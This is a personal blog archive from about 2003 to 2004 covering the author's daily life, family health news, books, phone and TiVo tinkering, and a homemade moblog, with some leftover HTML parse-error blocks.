                <p>today is good. I went to bed somewhat early last night(1am) and I got a lot of sleep. I of course had strange sleep dreams and somehow ended up tieingmy self in my blankets but that is totally normal. Last night brad, erica, matiss and myself all hung out and talked. it was fun. well the subject matter left a little to be desired.. but it wasn&#8217;t hte fault of the participants. we then played 16 tracks on mario kart and I air-zooka&#8217;d everyone. it ruled. <br /><br /> i got a <a href='http://3gcoding.com/archives/000008.php'>bluetooth headset</a>. it rules<br /><br /><a href='http://nationmaster.com/'>this website</a> is really strange. it is a statistics website about countries.. heh. you can find which country is the <a href='http://nationmaster.com/graph-T/cri_mur_cap'>most murderous</a> or which is the <a href='http://nationmaster.com/graph-T/eco_bud_rev_cap'>most taxed</a>(btw it is insane that the peopl in the holy see are taxed an average of $232,888.89 per person. wtf.) - the best though is the country which is the <a href='http://nationmaster.com/graph-T/spo_oly_med_syd_200_cap'>most atheletic</a>. <br /><br />maybe I will get to hang out with morgan later. if not I guess I will settle for rading. hah. wtf. I am a dork I guess. wait.. I don&#8217;t guess.. I know. speaking of reading.. (am I really speaking???) - I finished my other philip k dick book: &#8220;eye in the sky.&#8221; it was fun. it was about some cats who fell and were stuck in other peoples made worlds. it was written in the 50s so communism and racism were big on the minds of everyone(versus now :P). next I am on to &#8220;wild sheep chase&#8221; by murakami. w00t.</p>

                <p>This weekend was fun. besides having the craziest of sleep patterns I was able to hang with some away cool cats. first on friday I hung out with morgan. we went and got dinnera nd then came back to my place and drank and talked with matiss and hiromi. we ended up watchin a korean remake of ringu called the ring virus. it was ok. not wonderful. I should have pushed for fun sai yuk. but nooooo&#8230; ;) then on saturday I slept until 6. it is madness. no matter when I go to bed I am seemingly able to sleep ALL day. I don&#8217;t really think this will work out well with my work schedule ;). on saturday I woke up at 6 and matiss hiromi and I hung out and watched something. I don&#8217;t remember what.. then we went to the duke of perth and had excellent fish and chips. it ruled. on our way home we stopped at barnes and nobles and looked at books. I got <a href='http://www.amazon.com/exec/obidos/ASIN/0765308835/nata2productions'>the peace war</a> by Vernor Vinge - which I ended up reading last night. it was good. I am such a sucker for science fiction. haha. I also got a couple of philip k dick books as well. I enjoy him. I like reading about alternative realities. <br /><br />time for <a href='http://www.acapulcotans.com/image/about-bed.jpg'>bed</a>. hopefully I will get up at an appropriate time. :)</p>

I didn&#8217;t expect to be rated so hi. it is surprising especially since it is cobbled together and has a bunch of very person pictures on it. I wonder how many people stumble across it and end up looking at picture of me and my friends.. heh. how fun.</p>

                <p>so I couldn&#8217;t sleep again. I ended up finishng the book I started - which is always a good feeling. I ended up starting a second book.. but I put it away with fear that if I didn&#8217;t I woudl finish it too and it would be 8 in the morning. I suppose this is one of those days where I coudl afford to not sleep. but it would really wear on me. I don&#8217;t want that much. so I solved the problem by getting up and making myself some dinner ;) I guess it is almost three but whatever. hiromi was up so I tricked her into making her some food too. I made some <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1073290732-t610%282%29.jpg'>awesome dinty moore stew with peppered green beans</a> and hiromi made some <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1073290836-t610%282%29.jpg'>peas with fancy sauce and seaweed</a>. mine was better. hahaha. so hearty. ;) <br /><br />well I supposed I should goto bed. I don&#8217;t really feel like it. but I can feel my energy level dropping as my body realizes it has food. ahhh.. food&#8230;</p>

                <p>and I have been thinking about merging them all into one of two sites. making all my personal sites have the same motif. making the blog have categories and importing all the old entries into a nifty category system. I don&#8217;t know yet. but I have been looking at some others and I noticed that a lot of them have incredible blogs.. and one of the reasons is you don&#8217;t have to jump all over the internet looking for something. maybe I will follow. then again. maybe not. I have enjoed have nata2 to myself. with no comments and all that crap. I really like having it be just a journal. but sometimes I look at other sites and I am like.. woah I could be that. hmm. I will have to evaluate this. I need another project. maybe I will get a <a href='http://ironkungfu.com/wiki/index.php/Possible%20New%20Computer'>new computer</a>. I need to finish some smaller projects and then I will be free. ;) <br /><br />i am sleepy. I will goto bed. happy new years all. did you hear its january ;)</p>

                <p>so work is going wellish. I guess as well as work always goes. I am excited to be back. all the silliness and problems beware - I am prepared to attack ;)<br /><br />so I really enjoy reading peoples blogs and now that I have discovered the love of the rss aggregators and the wonders of OPML I really appreciate all that it does for me. I was reading my morning blogs when I stumbled upon <a href='http://joi.ito.com/archives/2003/12/26/delicious.html'>this</a> link from <a href='http://joi.ito.com/'>joi ito</a> about a great site called <a href='http://del.icio.us'>del.icio.us</a> that allows a person to sumit their bookmarks to create a community bookmark list. this is coupled with the power of an <a href='http://del.icio.us/rss'>rss/xml</a> feed and wham. you get a dynamic bookmark list to browse. it is pretty fun. <a href='http://del.icio.us/nata2'>check out my bookmarks</a>.<br /><br />so I ordered my mother an <a href='http://www.ambientdevices.com/cat/beacon/beaconorderform.html'>ambient weather beacon</a> from <a href='http://www.brookstone.com/shop/product.asp?product_code=423947&cross_flag=y&world_code=2&category_code=23&subcategory_code=417&quickshop_code=&search_type=subcategory&search_words='>brookstone</a> on the 15th of december. I thought that since the cut off for christmas shipping was the 16/18th I woudl be fine. but oh no. I wasn&#8217;t apparently they totally screwed up their oreder tracking and such and failed to notify me that they were no longer carrying the device. so when I called the 5 times from december 19-24th they kept telling me ithad been shipped. they even went so far as to tell me invalid tracking numbers. it was quite annoying. they even told me that they were able to track it on the ups website by last name(an impossibility). so finally someone said they woudl call with a tracking number on friday the 26th - which was obviously not a solution. so I gave up and was like.. whatever. <br />then I got home on friday, got my mail on saturday and read a letter that brookstone convieniently delivered to my billing address that they no longer carry the product. so roughly ten days after I order this product - well after it should have arrived. they notify me that they don&#8217;t carry it, on christmas eve. wtf. man I was pissed ;)<br /> but now I get to engage in a great customer service exchange. seriously what were they thinking. <br /><br />you can modify the color of my ambient device by going <a href='http://dopeman.org/ambient'>here</a>. it is lame right now. but I will spruce it up in a bit. it cracks me up that it works. I wish it updated faster. I think I am goign to write a deskop client for it. ;)<br /><br /></p>

<p>i <a href='http://www.woodpeckerfilm.fi/rare/video_large.html'>really enjoyed this movie</a>.</p>

                <p>So we had a great xmas. I am glad to be back but I was really happy to be able to spend <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03'>christmas with my family</a>. my cat had a <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03&img=christmas%2003%20030.jpg'>hole</a> in it. it was gross. but apparently it is getting filled in or has gotten filled in. it was really nasty. we all hung out and dressed up. my father wore his <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03&img=christmas%2003%20009.jpg'>bling</a> and I wore <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03&img=christmas%2003%20007.jpg'>my fur</a> - dylan was <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03&img=christmas%2003%20002.jpg'>dressed normal</a>. I learned a bunch of <a href='http://nata2.info/?path=pictures%2Fholidays%2Fchristmas_03&img=christmas%2003%20037.jpg'>magic</a>. it was awesome. <br /><br />i really think that <a href='http://www.biosci.ohio-state.edu/~parasite/enterobius.html'>pinworms</a> and <a href='http://www.ambergriscaye.com/pages/town/botfly.html'>botflys</a> are gross. much grosser than holes in cats. <br /><br />my thoughts go out to the knutson family.</p>

                <p>On saturday - my mom, dad and hiromi all went to the hobby shop to look for hobbies for my father. he didn&#8217;t find anything so I later went back and got him a <a href='http://www.ramseyelectronics.com/cgi-bin/commerce.exe?preadd=action&amp;key=PL130'>130 in 1 electronic experimentation kit</a> and a <a href='http://www.modelflight.com.au/rc_model_cars/tamiya_rc_cars_rover_cooper.htm'>fancy radio control car kit</a>. Hopefully he won&#8217;t be bored. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;Then we all went ice skating.. well we didn&apos;t actually go ice skating - we went to an &lt;a href=&quot;http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;amp;img=1071968264-t610(1).jpg&quot;&gt;figure skating show&lt;/a&gt;. it was quite something. a friend of my family was in it - she was good. the figure skating was in the &quot;&lt;a href=&quot;http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;amp;img=1071968264-t610(1).jpg&quot;&gt;natatorium&lt;/a&gt;.&quot; heh. I don&apos;t quite know if I enjoy figure skating as of yet. I imagine I will figure that out soon enough. after the figure skating.. we went to a &lt;a href=&quot;http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;amp;img=1071990746-t610(1).jpg&quot;&gt;fancy party&lt;/a&gt; dressed as future people. &lt;br /&gt;&lt;br /&gt;on sunday - we all hung out around the house and cooked. we made candy and peanut brittle and all sorts of goodies. I cut myself twice on the candy.. :( but that is ok ;)&lt;Br&gt;&lt;Br&gt;so last night I stayed up and made a opml reader - mostly cuz I wanted to be able to easily read all my favorite websites without a lot of work or even effort. so chekc it out &lt;a href=&quot;http://dopeman.org/opmld/&quot;&gt;here&lt;/a&gt;. it is in the same vein as the &lt;a href=&quot;http://dopeman.org/klip/&quot;&gt;.klip maker&lt;/a&gt; I made. hopefully it works for all. I did notice it didn&apos;t work for a couple. but whatever ;)&lt;Br&gt;&lt;br /&gt;soon I will be adding trackbacks and possibly comments to this blog. maybe. maybe not. &lt;Br&gt;&lt;br /&gt;eep!</pre></p>

I really don&#8217;t know what we will do for the week. but I imagine it will be entertainmentfull ;).<br /><br />i am wearing my new <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1071869172-t610(1).jpg'>fancy boots</a>. I am attempting to decide whether I am going to wear them to colorado. if I do I have to really commit to wearing them around. but I guess I do have my fancy man shoes to wear as well.. ;) hehe. wait until I post pix of my fancy man shoes.. but right now.. this fancy man is totally late and needs to run. run run.</p>

                <p>So my mobile phone fascination has reached a new height. I took some spare time in the last couple days and compiled a phon/mobile/technology blog. check it out <a href='http://www.3gcoding.com'>here</a>. Hopefully it will continue to foster exciting phone stuff for my head. and make me a million dollar bills.<br /><br /></p>

I sometimes hate that I am not the taskmaster I need to be. doh! stupid wondering mind. I really need to finish the cholo site and I need to finish my servers. jesus I need to finish my servers. heh. I think I am going to add trackback functionality into my nata2.org blog. I really like all of the fancy features you can do with trackback and technocrati or whatever. someday. I will be a blog god. hahaha. stupid internet. never getting me a girlfriend. <br /><br />i am really excited to get my <a href='http://www.ambient411.com'>ambient</a> <a href='http://www.ambientdevices.com/cat/orb/orborder.html'>orb</a> hooked up and working. I am not sure what I will have it monitor. probably homeland securitythe weather, my servers and of course my friendster messages. hahahah. wait wait. I got it. I will have it monitor the homeland security thing and ambient my tivo&#8217;s themes - which will msg my phone.. to tell me when to duck from a bomb. awesome. I rule!<br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

I just have to budget my time better. I didn&apos;t do very well these past couple days. but I guess that makes since.. as I was busy with family stuff.. and such ;)
&lt;BR&gt;&lt;br /&gt;last night I picked up the alien box set.. something quadrology -heh. it rules. there are NINE dvds. it extends like 7 ft or something. I am happy. so with that, pirates of the carribean and the new LOTR: return of the king - this week is gunna rule the movies. &lt;br /&gt;&lt;br /&gt;i have to go and shower, pack, clean, run errands for my folks.. then I gotta drive my truck (hahaha I have a truck) to the airport and fly to chicago. wheee...</pre></p>

                <p>today I went to the doctor, hung out with my father and mother, played games, and then watched a couple of movies. it ruled.<br /><br />My father is getting better rather quickly. he is off everything but his random IV or drug insertion. it is like sql but with an needle and an arm. so we hung out and joked. I played the &#8220;describe a yoyo trick and I will do it&#8221; game with my dad. of course he picked &#8220;around the neck&#8221; - which ended up with the yoyo pounding my face. it hurt ;). then we played a bunch of phase 10 and generally hung out. I am very greatdul that everything is going so well. it is too bad that he is still partially debilitated - but I am sure that will wear off shortly. <br />after hanging out with pops.. we went to dinner with dylan and sarah. it ruled. they are fun kids. <br /><br />then my mom and myself came home and watched movies. we watched <a href='http://www.imdb.com/title/tt0259446/'>my big fat greek wedding</a> and then I watched <a href='http://www.mirabaifilms.com/monsoon.html'>monsoon wedding</a>. it was a wedding kinda night.

                <p>I really like the idea of mobile blogging and haven&#8217;t been too keen on using my keypad to do an entry on my blog. A friend showed me his <a href='http://bryan.textamerica.com/'>moblog</a> that he made using his <a href='http://www.nokia.com/nokia/0,,2273,00.html'>3650</a> and i thought that it couldn&#8217;t possibly be that hard to create a similar thing using the mms message sent from the phone. As far as i can tell - the mms message is composed of fancy headers and then the payload as an attachment.</p>
<!--more-->
<p>With this in mind i started looking at anti spam and email filtering scripts and wrote a script that extracts the MIME message from an email. This wasn&#8217;t hard. so i hooked that into my blog and bam i got my own <a href='http://www.nata2.org/photolog.php'>little moblog</a> - albiet it is kinda ghetto ;)</p>

<p>my only complaint is the speed it takes to upload the pictures ota.</p>

<p>It works pretty good and has been fun to use.</p>

                <p>So yesterday my fathers surgery went without a hitch and he now has a cyborg heart. it rules - mainly cuz his un-cyborg heart was full of badnesss so it would have not been so keen on working much longer. cyborg parents are all the rage I hear. So anyway.. he is doing great. almost all the tubes are out. and he is sleepy.<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;it is weird though.. the move from immortal parents to immortal kids. it seems that somewhere around 20-25 (of course a sliding age) the parents pass on this idea of immortality to their children. umm&lt;br /&gt;&lt;br /&gt;i have a LOT of work to do tonight. </pre></p>

                <p>so I am home. my parents picked me up from the airport and we went to eat at the cherry creek grill. it was nice. it was very colorado. afterwards I was driving and I went to shut a door and I cut <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1070695703-t610(2).jpg'>my finger all up</a>. <br />so being home is nice. I really have njoyed hanging with my rents for the past month and will enjoy hanging out with them this coming month. I do wish, however, thst we were meeting this week for a different reason. it is kinda scary to have a sick or ailing parent. us children feel very helpless. such a sad feeling. because we arn&#8217;t helpless - we are able tofully support our parents and what not - it is just a paradihgm shift of who is the immortal ones and who isn&#8217;t. <br />so my fathers surgery is scheduled for early tuesday morning. dylan and I will be there, as will my mom. I will of course keep everyone informed. it is weird cuz the surgery has a high success rate - but it is still heart surgery. so it is scary. I have never really seriously talked with my parents about them dieing - but now we have to. stupid no good hearts. ;) luckily we have a great outlook on life and everyone is happy and loving. no matter what happens.. it will work out. ahhh fatalism.</p>

                <p>On the LNP day last month i immediately ported from sprint to t-mobile. I had been with sprint for 4 years and was appreciative of their &#8220;3g&#8221; technology. but after gettgin completely screwed one too many times i decided to switch. I had a tough time figuring out which provider to go with, although i had narrowed the phone down to the <a href='http://www.sonyericsson.com/t610/'>t610</a>.</p>

<p>I really liked the look and shape of the t610. the technology was right, the price was right and it was supported by a bunch of providers. so i called around and originally planned on going with cingular. it is supported by my work and would be convienient to get a number from work for use in a phone. however - i was annoyed by paying a bundle for data and was attracted to t-mobiles unlimited data plan for 19.95/month. so i went with t-mobile. in retrospect it seems to be a <a href='http://www.burningdoor.com/steve/archives/000267.html'>good decision</a>.</p>

<p>so i called t-mobile and initiated the port. this was 11/24 so they were quite busy and didn&#8217;t have the computers up to take the port info. so they wrote it down on paper. i waited the 24hrs. when i came into work the next day my phone had arrived and i was on my way. but i wasn&#8217;t yet ported. my sprint phone still worked. so i called tmobile again and i talked to a porting women who told me that no body had submitted my port to the &#8220;port authority&#8221; and that it wasn&#8217;t real yet. so she took all the info and initiated the port. by 5 oclock that day i was able to call on the tmobile network - but i wasn&#8217;t able to recieve calls on the tmobile net. by 8 i was able to do both.</p>

<p>So far i have enjoyed tmobile. sprint has a much better website and the cdma2k or whatever is a lot faster than the gprs. but bluetooth owns. i really appreciate the fact that most GSM providers are standards based.</p>

<p>now i am ready for the fun.</p>

<p>here they are. most of them are generic - but a couple are nice.</p>

                <p>So my photolog is done for now. basically I can take a picture with my phone and email it to a certain address - which then authenticates the email and posts the picture to my websites photolog. This rules.. ;) check it out <a href='photolog.php'>here</a>.</p>

                <p>So I made a bunch of themes last nigth waiting for my laundry to get done. you can find them <a href='http://ironkungfu.com/wiki/index.php/t610%20themes'>here</a>. This phone is fun and dope ;)<br />here are some <a href='http://www.esato.com/board/viewtopic.php?topic=44482&forum=29'>posts</a> about my themes.<br /><br />so I get home at 5:30 - tired. annoying.. wanting somethign fun to happen. I gather my laundry and take it downstairs - only to find someone has taken up both the dryer and the washer.. no problem.. I can wait. so I leave my laundry and wait an hour. 6:30 comes both machines are stopped.. the person doesn&#8217;t get their stuff&#8230; 7:30 still there.. I go to dinner with morgan.. come back at 9ish - still there.. 9:15 I see someone manipulating the dryer.. come back in ten minutes put my laundry in the washer. it gets done before ten. the dryer is done around 10:30. 11:30 - nobody has empied the dryer, 12:30 same. so I emptied it with a note. hopefully the person will understand. I have to sleep.. jesus I am tired.</p>

I think&#8230;. anyway.. on saturday my friends and I were bored&#8230; so I went and bought a <a href='http://www.nintendogamecube.com/'>gamecube</a> and a couple of <a href='http://www.mariokart.com/launch/index.html'>fun</a> <a href='http://www.marioparty.com/'>party</a> games. The best part about it all is the <a href='http://www.nintendo.com/gcnlarge?gallery=accessory&amp;currentNo=5'>wireless controllers</a> - seriously.. so awesome. next is the broadband <a href='http://www.nintendo.com/gcnlarge?gallery=accessory&amp;currentNo=7'>connector</a>.. then with the help of phantasy star.. freedom.. and a homebrew dev system ;)<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>It is a lot of fun. I got a Sony Ericsson T610 from tmobile. as you probably know I was way into sprint phones for awhile. and I recently used the new number portability rule to switch from sprint to tmobile. it was relatively painless - but I spent to much on the phone. btw. bluetooth RULES. I have it so I always sync my phone when I walk into my room. I also have made it turn off my computer when the phone leaves ;) it rules. I can be watching TV in my living room playign on my laptop and have the phone msg my laptop that I have received a call. I think I might be able to write a bluetooth app that sends the call to display on my tivo. that woudl rule. heh. so much ;). I will be release some hacks and such for the phone in the next couple weeks. I have created 4 themes and will continue pumping stuff out as time passes - one of two things I have planned is to make an app that allows you to send any supported file to the phone via MMS. the the other thing is to make a app in perl that will parse and email from the phone and post a picture. that way I can just email pictures as I go and I don&#8217;t have to save them ;). it will rule. I can create a photolog from my phone. I rule.<br /><br />my parents flew in yesterday and we had a relaly nice thanksgiving meal at rezas. it ruled. I was very pleased. we then went back to the hotel and played scrabble. a great way to spend time with my parents. I have been seeing them a lot and will continue to. my father is havign surgery on the 9th so I will be in colorful colorado from the 5th to the 15th. it will be nice. but I will be VERY busy - which sucks. I am goign to have to figure out how to work from home. I imagine I will be using my laptop a BUNCH. I will have to wardrive greeley ;) doh. <br /><br />i really need to sleep. I went to crobar a couple nigths ago and didn&#8217;t get home until 6:30. it was a nice time. I will possibly post pictures later.</p>

                <p>So I slept all day yesterday and came to work at 6:00pm and now it is 7:15am and I am confused about what dday was yesterday and what day was two days ago. it seems like a billion years have passed since I was last home.. I guess sleeping under your desk will do that to you. we are apparently finally live. which is nice. I am apparently finally sleepy. <br />need to go home. then bed. <br />need to go home. then bed. <br />need to go home. then bed. <br />need to go home. then bed. <br /><br />umm&#8230; yea.. <br /><br /><a href='http://submissions.versionfest.org'>check out my new project</a>.</p>

                <p>soemthing happened that made me think.. &#8220;blog this!&#8221; but I don&#8217;t remember what it was. bummer. maybe I will remember. <br /><br />i got the tivo working. it is pretty fun. I have yet to get the wireless inet working for it. stupid /dev/wlan isn&#8217;t there. I don&#8217;t understand why. the driver just doesn&#8217;t do it. damned USB. I thought about going and buying a shittier one today at compusa. maybe I will do that during lunch. apparently I need a belkin one. heh. we shall see - I really want the net stuff to work. then I can put the tivo in my cabinet. but I did get it all working.. and now it randomly records all my favorite shows.. it even recorded a bunch of porn last night - wtf. stupid suggestions. ok.. lunch time..</p>

                <p>This morning was awesome. I really feel that getting up leisurely at 10:30 is a healthy way to live. last night I attempted to stay up late to help with work stuff. but I onlly made it to about 3:30ish.. I was bummed out. I had planned to stay up late. but I didn&#8217;t get a chance to take my much needed afternoon nap. I suppose I could have used this opportunity to start doing cocaine ;) hahah. umm.. yea.. anyway.. I ended up breaking my tivo again. I really am not good at the tivo. I get it to work. and then immediately break it. all I want to do is get it really solid. but nooooooooooooooooooo. god hates me. well god.. I hate you.<br /><br /></p>

<p>a couple days ago I found an <a href='http://alucinari.cc/'>old friend</a> from high school on the ol interweb. it is always funny finding stuff like this. you never expect it. anyway.. he is a computer nerd as well and does blog stuff.. he mentioned that I should start pinging all the blog sites(<a href='http://www.weblogs.com'>weblogs.com</a>, <a href='http://blo.gs'>blo.gs</a> and <a href='http://blogrolling.com/'>blogrolling.com</a>). So I found a <a href='http://www.yaysoft.com/pingweblogs.php'>good script</a> to start our with and I modified it to be a bit more useful for my blog software (i really didn&#8217;t do anything but make it work with the other sites :P). and BAM. it shoudl be working. so this is my official.. or maybe unofficial test of whether it works or not. ready. I am about to save and hit publish. !!! eep</p>

                <p>So tonight I got home from work and rushed over to the house of blues to see hanson. my friend chris is friends with them so he hooked a bunch of us up with opera box seats.. and we hung out. it was really great. I was blown away by the talent and charisma that they held. it was intense. quite fun. we then hung out and just talked a bunch with them. they are nice. hopefully I got them to purchase some of the sun.. ;)<br /><br />oh.. and the tivo was mine.. until it stopped working. stupid tivo.</p>

                <p>On saturday night, matiss and I went to <a href='http://www.bubbahotep.com/'>bubba ho-tep</a>. it was really great. chris said it was perfect - and I have to partially agree with him. it was damned close. all I knon is that now being monday morning.. I am ready for some <b>A C T - I O N</b>. ;)<br /><br />i am really sleepy last night. for some reason I just didn&#8217;t sleep well. stupid well. <br /><br />i am reading a book called &#8221;<u>With Charity Toward None: A fond look at misanthropy.</u>&#8221; it isn&#8217;t very good. it appears that the author is just bitter and immature (and well read, and eloquent :P). It is like reading a teenage diatribe on why no one understands them - however she is remarkably eloquent.<br /><br />btw - my blogging style has gone all to hell. wtf. I can&#8217;t keep a straight thought for the life of me. I jump all around and forget the initial scope for my entry. I attribute this to the busy-ness of my mind and my internal dialog being totally screwed up. but whatever. I imagine soon it will be beter - once my finances are solid again and I am able to grasp what exactly is happening around me ;)</p>

                <p>So last night I went to the metro and hung out with my friends. it was the first time in awhile. I love going out. but recently I have been dieing. I haven&#8217;t been able to stay out as late. maybe I am getting old. god I hope not. but whatever. I have a fucked up growth on my back. I talked to my doctor - who was like.. &#8220;it is nothing.. don&#8217;t worry about it. &#8221; whatever. I think I am going to have matiss cut it out with a knife. that would be fun. I was wondering if I could get a fierce topical anesthetic to numb the pain. but I keep having day dreams that the bumb is really a maggot or some larva stuck in my skin from my days in the bush. bot fly. eeep. <br /><br />tonight I am supposed to goto elephant. I am pretty excited. I have such a weird feeling about high school violence. I think violence in general. however I really feel like I was connected to the kids that did the crazy shit at columbine, I mean - they wore black - were excluded by their classmates and were &#8220;crazy&#8221; - all of which I was too. so I guess I empathize with the idea of making an attempt to get even. I just wish they would have done it in a more constructive way. like salting the football field or whatnot. stupid guns.<br /><br />in other movements in my life. I have been somewhat interested in discussing or investigating the philosophy of misantropy within our culture. I am starting to feel that my music may be fascist. I hate fascism. stupid fascism. I hate nazis more. goddamn nazis.</p>

                <p>This weekend was insane. as you may be able to tell from the crazy blog entries. I was a madperson. So.. on saturday I went to quad cities juggle fest. it was a lot of fun. I hung out with mark and some nice jugglers from carleton college. we juggled a bunch. I love juggling with little kids - who are as good as I am. hah. at five or so I went to the theatre with mark.. and hung out with the performers a bit. then <a href='http://nata2.info/?path=pictures%2Fholidays%2Fhalloween_2003&img=halloween_crazy%20013.jpg'>derek</a> and <a href='http://nata2.info/?path=pictures%2Fholidays%2Fhalloween_2003&img=halloween_crazy%20012.jpg'>kevin</a> came and we got dinner. after dinner was the <a href='http://nata2.info/?path=pictures%2Fholidays%2Fhalloween_2003&img=halloween_crazy%20014.jpg'>show</a> which we watched. After the show we went to Mt. Vernon(where my <a href='http://www.cornellcollege.edu'>alma mater</a> is) and hung out. I hung out with derek and his gf(who is really cool) and generally chilled out. While at the bar I ran into a really <a href='http://nata2.info/?path=pictures%2Fholidays%2Fhalloween_2003&img=halloween_crazy%20017.jpg'>old friend</a> who I hadn&#8217;t really hung out with since 6th or 8th grade. we all left the bar and helled about campus - drinking on tarr roof, hangin out in the dorms and <a href='http://nata2.info/pictures/holidays/halloween_2003/halloween_crazy%20022.avi'>just generally causing a ruckus</a>. it was fun. I then made my way back to derek&#8217;s gfs house - where we were staying. I woke up at 11:30 or 12 and we headed back to the quad cities. I juggled a bit and yoyoed a bunch. mark and I headed out and I got back to chicago aruond 10.<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;at 10 I had a meeting for work. this is where the craziness started. my coworkers and I met from 10pm until 3:30am. at this time it was decided that I should go to the office and fix some shit. so I went to the office. I coudln&apos;t figure out how to turn the damn lights on( I finally figured it out). and I attempted to fix shit. so then I met with everyone from 8-2:30. I got home at 3 and crashed until 7:30am this morning. and that is where I am now. a bit weak from not eating.. but generally rested. &lt;br /&gt;&lt;br /&gt;so in summary.. I worked 18hrs straight and then slept 17hrs. I rule. </pre></p>

                <p>so I was woken up to do more work.. and I am really annoyed - because the sysadmins decided to chaneg the password and not tell us. which means everything stops until they are awaken and tell me. however.. they turn off their phones and are not coming in until later. so I have no way of doing my job. this is annoying. stupid phones. why isn&#8217;t the ringer embedded in to peoples temples. <br /><br />ok more trying.. less drugs..</p>

                <p>so this mornign at 7 we started launching a site at work. I was sleeping. because last night was halloween. and I didn&#8217;t goto bed early. stupid satan.. always keeping me up. <br /><br />nothing is better than death metal at seven in the morning.<br />Last night, after my work.. I hung out with hiromi and read. it was fun. then we went to reza&#8217;s - which is always good. after that we cabbed it up to winnies thing at park west. which was full of hot women with fake boobs.. we decided it wasn&#8217;t for us and we went to the &#8220;where ravers goto die party&#8221; - which was a lot of fun. but strangely around 12 it became not fun. so we went to the texas space. it ruled. no I am waiting for mark to pick me up to take me to a juggling festival. whee..</p>

                <p>So today.. I was watching cky4 hanging out with mark and matt.. waiting to goto juggling club.. and as soon as we should have left for juggling club.. I got a call from <a href='http://derek.broox.com'>derek</a> exclaiming that my server wasn&#8217;t responding. so I immediately called my lovely <a href=''>colo facility</a> and mentioned to them that I needed my server rebooted. so they rebooted it.. and it came back up.. the women I was talking to mentioned that I was receiving an insane amount of traffic on port 80 from a huge number of ips.. so she told me an ip - which I looked up in my access logs and noticed that the particular ip was downloading the <a href='http://nata2.info/war/AC-130U_gunship_video_high.mpg'>160mb war video</a> on <a href='http://nata2.info/?path='>nata2.info</a>. so I looked at the log file and noticed that it was 80mb in 5 days. and that almost ALL the requests were for the <a href='http://nata2.info/war/AC-130U_gunship_video_high.mpg'>160mb video</a>.. and that they all came from this <a href='http://www.hk94.com/weblog/index.php?p=62&c=1'>specific website</a>. which linked to my file. which also.. apparently was mentioned on <a href='http://www.howardstern.com/'>howard stern</a>. so a link to my website.. for a 160mb file was mentioned on a nationally syndicated talk show. wtf. so I made a clever file to <a href='http://nata2.info/war/AC-130U_gunship_video_hi.mpg'>combat the bandwidth stealers</a>.. .. that will slow the bandwidth right now.. but we shall see how it goes.. hehe.. <br />i rule</p>

I saw my cousins football game today. he did a good job. it is really funny watching little kids play sports. they do really funny things. COle is the quarterback.. so he got to play a lot.. and he is quite good. then we had a nice dinner.. and then I went to fort collins to see where dylan lives, works and hangs out. it was nice. his house is nice. we played a bunch of really dumb games at his work&#8230; and wasted a lot of money on STUPID STUPID thing.. haha<br />afterward.. we were going to goto cactus canyon.. but we instead went to walmart and purchased estes rockets and lit them off in mikes subdivision.. it was a blast.. haha.. so much fun. I got good video..</p>

So apparently mel gibson has lost his mind and is making a movie about the &#8220;real story&#8221; of christ. and while they were filming.. the guy playing christ was struck by lightning. hahahahahahahahaha.. seriously.. and the assistent director was hit as well. for the second time since they started shooting.. &#8220;a producer described how he saw lightning come out of the actor&#8217;s ear.&#8221; hahahahah.. <br /><br />god rules&#8230; hahaha stupid jesus</p>

                <p>So I get bored every once and awhile and I want to &#8220;hack&#8221; stuff. so lately I have been into hacking the ps2 and the tivo. I just ordered a tivo to hack and I just got my &#8220;key&#8221; to the ps2 world. so yesterday I burnt a couple disks to test out my set up. and wham it worked. I was able to boot the ps2linux rescue disk. however, the HD is not formatted so I wasn&#8217;t able to boot BBnav. I attempted to format it.but I was sleepy and didn&#8217;t really want to deal with it. so I went to bed. so tonight. I am going to attempt to format the hard drive.. install bbnav and then boot bbnav. I should also be getting my usb 2 usb cable to modify the save files on the memory card so I can boot right into bbnav.. without a boot disk.. <br /> hmm.. <br /><br />i cannot wait.. for the tivo to come. it should be a fun game. I will install a new HD.. set up tivo web and then write some fancy tcl apps to manipulate the tivo. I really want to be able to view the current weather and other pertitent info.. like my friends weblog RSS files from the tivo. someday!!! SOMEDAY!!</p>

                <p>So I have been using itunes for around 24 hours now. I have come to the conclusion that we in the PC world are lucky. We have a plethora of software made by a very diverse set of vendors - all of who struggle.. so each product ends up having its own variation on the solution.. they each have unique features.. and eventually one or two products win. The PC software world seems to be based a bit more on the evolution of the solution. So this is how it goes in the world of the IPOD.. one product comes out that solves the problem(<a href='http://www.mediafour.com/products/xplay/'>xplay</a>) and then another product comes out that solves the problem better but is plagued with bloat(<a href='http://www.musicmatch.com'>musicmatch</a>). From here, an independent software vendor comes out with a more elegant but amature solution(<a href='http://www.ephpod.com'>ephpod</a>) and survives to be bought out by another vendor(<a href='http://www.moodlogic.com'>moodlogic</a>). Then with tech. success of the independents a bunch of smaller vendors start coming out with products(<a href='http://www.redchairsoftware.com/anapod/'>anapod</a>). So the products all work on what was previously done to solve the problem better and better - until a clear industry leader is evident. <br />so recently <a href='http://www.apple.com'>apple</a> released <a href='http://www.itunes.com'>itunes</a>.. which is an awesome jukebox/mediaplayer and 